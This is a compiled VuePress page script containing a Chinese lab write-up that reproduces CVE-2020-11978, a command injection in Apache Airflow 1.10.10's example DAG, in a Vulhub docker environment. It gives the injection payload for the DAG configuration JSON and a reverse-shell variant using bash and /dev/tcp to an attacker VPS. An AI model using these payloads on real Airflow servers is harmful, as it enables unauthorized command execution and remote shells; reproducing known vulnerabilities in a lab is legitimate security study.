import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as n,c as l,a as e,b as a,d as t,e as c}from"./app-58e4a7d6.js";const s={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Apache Airflow是一款开源的分布式任务调度框架，通过DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具，不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。",-1),h=e("p",null,"在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。",-1),u=e("p",null,"由于启动的组件比较多，可能会有点卡，运行此环境可能需要准备2G以上的内存。",-1),g=e("p",null,"参考链接：",-1),m={href:"https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx",target:"_blank",rel:"noopener noreferrer"},f={href:"https://github.com/pberba/CVE-2020-11978",target:"_blank",rel:"noopener noreferrer"},_=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub依次执行如下命令启动Apache Airflow 1.10.10：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#初始化数据库
docker-compose run airflow-init

#启动服务
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>服务器启动后，访问<code>http://your-ip:8080/admin/airflow/login</code>即可查看到登录页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问<code>http://your-ip:8080/admin/airflow/login</code>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948096.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再点击执行按钮，在Configuration JSON中输入：<code>{&quot;message&quot;:&quot;&#39;\\&quot;;touch /tmp/airflow_dag_success;#&quot;}</code>，再点<code>Trigger</code>执行dag：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948097.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>等几秒可以看到执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948098.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>到CeleryWorker容器中进行查看：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose exec airflow-worker ls -l /tmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以看到<code>touch /tmp/airflow_dag_success</code>成功被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948099.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>相同方法执行反弹shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{&quot;message&quot;:&quot;&#39;\\&quot;;bash -i &gt;&amp; /dev/tcp/your-vps-ip/9999 0&gt;&amp;1;#&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202204251948100.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,19);function b(x,v){const i=r("ExternalLinkIcon");return n(),l("div",null,[d,p,h,u,g,e("ul",null,[e("li",null,[e("a",m,[a("https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx"),t(i)])]),e("li",null,[e("a",f,[a("https://github.com/pberba/CVE-2020-11978"),t(i)])])]),_])}const y=o(s,[["render",b],["__file","Apache Airflow 示例DAG中的命令注入 CVE-2020-11978.html.vue"]]);export{y as default};
